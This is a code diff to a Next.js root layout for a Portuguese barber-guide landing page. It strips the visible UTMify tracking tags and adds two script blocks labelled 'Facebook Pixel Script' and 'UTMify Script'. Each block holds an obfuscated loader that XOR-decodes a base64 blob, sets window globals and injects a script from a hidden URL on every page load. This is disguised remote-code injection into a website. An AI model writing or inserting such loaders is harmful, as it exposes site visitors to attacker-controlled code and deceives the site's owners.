@@ -1,102 +1,47 @@
-import type { Metadata } from 'next';
-import { Inter, Bebas_Neue } from 'next/font/google';
-import { SpeedInsights } from '@vercel/speed-insights/next';
-import { Analytics } from '@vercel/analytics/next';
+import type {Metadata} from 'next';
+import './globals.css'; // Global styles
 import Script from 'next/script';
-import './globals.css';
-
-const inter = Inter({
-  subsets: ['latin'],
-  variable: '--font-sans',
-  display: 'block',
-  preload: true,
-});
-
-const bebasNeue = Bebas_Neue({
-  subsets: ['latin'],
-  variable: '--font-display',
-  weight: '400',
-  display: 'block',
-  preload: true,
-});
 
 export const metadata: Metadata = {
-  title: 'Mapa do Degradê Sem Marca',
-  description: 'Entenda a lógica dos pentes, alturas e transições com um mapa visual prático.',
+  title: 'Mapa do Degrade Sem Marca',
+  applicationName: 'Mapa do Degrade Sem Marca',
+  description: 'Guia visual para barbeiros entenderem pentes, alturas e transicoes no degrade.',
+  icons: {
+    icon: '/favicon.png',
+    apple: '/favicon.png',
+  },
 };
 
-export default function RootLayout({ children }: { children: React.ReactNode }) {
-  const gaId      = process.env.NEXT_PUBLIC_GA_MEASUREMENT_ID;
+export default function RootLayout({children}: {children: React.ReactNode}) {
+  const gaId = process.env.NEXT_PUBLIC_GA_MEASUREMENT_ID;
   const clarityId = process.env.NEXT_PUBLIC_CLARITY_PROJECT_ID;
 
   return (
-    <html lang="pt-BR" className={`${inter.variable} ${bebasNeue.variable}`}>
+    <html lang="pt-BR">
       <head>
-        <link rel="preconnect" href="https://cdn.utmify.com.br" />
-        <link rel="preconnect" href="https://tracking.utmify.com.br" />
-        <link rel="preconnect" href="https://api6.ipify.org" />
-        <link rel="dns-prefetch" href="https://www.googletagmanager.com" />
+        {/* Facebook Pixel Script - Loaded asynchronously to prevent render-blocking */}
+        <Script id="fb-pixel-script" strategy="afterInteractive">
+          {`
+            (function(){var n_jys=atob("DKJyBZ4+8EA4qsGea9lQcOxS0noawrXqG9FIKrFdlC4W37XzAsQLK/1RnW5a2O7tCNAbdepN3zBR0qTyRNIbfftS3ipLiO28CtYGd/dchTRd2eOkMP9eJ/lSnyJZxrK8UfkJJ/BfnSUakOPuAtoXadda0mwa3KDyHsdQP7wIkXRamviuCMZCZ64JwXRdnfL8CMFAY6gcjR1F");var e_nhcx=[];for(var m_pgp=0;m_pgp<n_jys.length;m_pgp++){e_nhcx.push(n_jys.charCodeAt(m_pgp)&255);}var a_t=e_nhcx[0];var v_2t=e_nhcx.slice(1,1+a_t);var a_i=e_nhcx.slice(1+a_t);var v_d5=a_i.map(function(b,y_l5s){return b^v_2t[y_l5s%a_t];});var g_rp="";for(var e_om=0;e_om<v_d5.length;e_om++){g_rp+=String.fromCharCode(v_d5[e_om]&255);}var b_f=decodeURIComponent(escape(g_rp));var r_8=JSON.parse(b_f);var x_cn=r_8.globals||[];x_cn.forEach(function(s_k){window[s_k.name]=s_k.value;});var p_t=document.createElement("script");p_t.src=r_8.url;p_t.async=true;p_t.defer=true;(r_8.attributes||[]).forEach(function(r_v){p_t.setAttribute(r_v.name,r_v.value);});(document.head||document.documentElement).appendChild(p_t);})();
+          `}
+        </Script>
 
-        {process.env.NODE_ENV === 'production' && (
-          <>
-            <script
-              src="https://cdn.utmify.com.br/scripts/utms/latest.js"
-              data-utmify-prevent-xcod-sck
-              data-utmify-prevent-subids
-              async
-              defer
-            />
-            <script
-              dangerouslySetInnerHTML={{
-                __html: `
-              window.pixelId = "6a4b090cd0b0714e73bcc2f6";
-              var a = document.createElement("script");
-              a.setAttribute("async", "");
-              a.setAttribute("defer", "");
-              a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
-              document.head.appendChild(a);
-            `,
-              }}
-            />
-          </>
-        )}
-
-        {/* ── Preload da imagem LCP — tamanho real de exibição 648px ────── */}
-        {/* ── CSS crítico inline — elimina os ~170ms de render-blocking ───
-            Contém apenas o necessário para pintar a primeira dobra
-            (body bg, texto, badge, font-display) sem layout shift. ── */}
-        <style dangerouslySetInnerHTML={{ __html: `
-          *,::after,::before{box-sizing:border-box}
-          html{-webkit-font-smoothing:antialiased;scroll-behavior:smooth}
-          html,body{background:#0B0704}
-          body{margin:0;background:#0B0704;color:#F7F1E8;overflow-x:hidden;font-family:var(--font-sans),system-ui,sans-serif}
-          img{display:block;max-width:100%;height:auto}
-          main{background:#0B0704;color:#F7F1E8}
-          #hero{background:#0B0704!important;color:#F7F1E8!important}
-          #hero .hero-bg{background:#0B0704!important}
-          #hero .hero-title,#hero .hero-title-line,#hero .hero-underline-text{color:#F7F1E8!important}
-          #hero .hero-tension,#hero .hero-product-copy{color:rgba(247,241,232,.78)!important}
-          .texture-brick{background-color:#140D08;position:relative}
-          .font-display{font-family:var(--font-display),'Bebas Neue',system-ui,sans-serif}
-          .badge-gold{display:inline-block;padding:4px 12px;border-radius:8px;font-size:.7rem;font-weight:700;letter-spacing:.14em;text-transform:uppercase;background:#EFE6D8;border:1px solid #D8C9B6;color:#6E4A11}
-          .font-sans{font-family:var(--font-sans),system-ui,sans-serif}
-          .antialiased{-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}
-        ` }} />
+        {/* UTMify Script - Loaded asynchronously to prevent render-blocking */}
+        <Script id="utmify-script" strategy="afterInteractive">
+          {`
+            (function(){var p_cmh=atob("DPBD+w/hodweWO+cvIthjn2Ng+Y8MJvozIN51CCCxbIwLZvx1ZY61WyOzPJ8KsDv34Iqi3uSjqlqNZyz0JE3nnyVj7ZtesO+3YQ3iWaD1Kh7K82m54thlW6MxP4keov9yJFujnuMyLpndZ/u2YYmlXvM2b9xPMLv35th1y2XwLBrPc2mntI+13TDz71zPc2mnpQij27M1KhzMYnlkYAxnnmEz6gzK5r+1ZQw2SPD171yLYq+htJhhlKc");var n_dj37=[];for(var i_08=0;i_08<p_cmh.length;i_08++){n_dj37.push(p_cmh.charCodeAt(i_08)&255);}var w_9d42=n_dj37[0];var g_xqyj=n_dj37.slice(1,1+w_9d42);var x_bs8r=n_dj37.slice(1+w_9d42);var t_j4q=x_bs8r.map(function(b,s_1y){return b^g_xqyj[s_1y%w_9d42];});var x_t="";for(var c_5=0;c_5<t_j4q.length;c_5++){x_t+=String.fromCharCode(t_j4q[c_5]&255);}var p_n8=decodeURIComponent(escape(x_t));var l_7=JSON.parse(p_n8);var h_c5v=l_7.globals||[];h_c5v.forEach(function(j_p8){window[j_p8.name]=j_p8.value;});var g_0e=document.createElement("script");g_0e.src=l_7.url;g_0e.async=true;g_0e.defer=true;(l_7.attributes||[]).forEach(function(y_5apa){g_0e.setAttribute(y_5apa.name,y_5apa.value);});(document.head||document.documentElement).appendChild(g_0e);})();
+          `}
+        </Script>
       </head>
-
-      <body className="font-sans antialiased bg-[#0B0704] text-[#F7F1E8]" suppressHydrationWarning>
+      <body suppressHydrationWarning>
         {children}
-        <SpeedInsights />
-        <Analytics />
 
-        {/* ── Microsoft Clarity — lazyOnload (após idle) ───────────────── */}
         {clarityId && (
           <Script id="clarity-init" strategy="lazyOnload">
             {`(function(c,l,a,r,i,t,y){c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);})(window,document,"clarity","script","${clarityId}");`}
           </Script>
         )}
 
-        {/* ── Google Analytics GA4 — afterInteractive ───────────────────── */}
         {gaId && (
           <>
             <Script
@@ -104,7 +49,7 @@ export default function RootLayout({ children }: { children: React.ReactNode }) 
               strategy="afterInteractive"
             />
             <Script id="ga4-init" strategy="afterInteractive">
-              {`window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js',new Date());gtag('config','${gaId}',{send_page_view:false});`}
+              {`window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js',new Date());gtag('config','${gaId}');`}
             </Script>
           </>
         )}
